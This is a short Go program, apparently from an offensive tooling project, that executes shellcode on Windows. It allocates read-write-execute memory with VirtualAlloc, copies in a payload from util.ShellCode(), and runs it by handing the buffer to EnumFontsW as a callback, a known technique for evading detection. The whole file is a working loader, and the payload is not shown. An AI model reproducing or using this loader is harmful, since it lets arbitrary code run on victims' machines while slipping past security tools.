package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"golang.org/x/sys/windows"
	"unsafe"
)

func Run(op []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	gdi32 := windows.NewLazySystemDLL("gdi32.dll")
	user32 := windows.NewLazySystemDLL("user32.dll")

	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	getDC := user32.NewProc("GetDC")
	enumFonts := gdi32.NewProc("EnumFontsW")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		panic("VirtualAlloc failed")
	}

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], op)

	dc, _, _ := getDC.Call(0)
	enumFonts.Call(dc, 0, addr, 0)
}

func main() {
	Run(util.ShellCode())
}
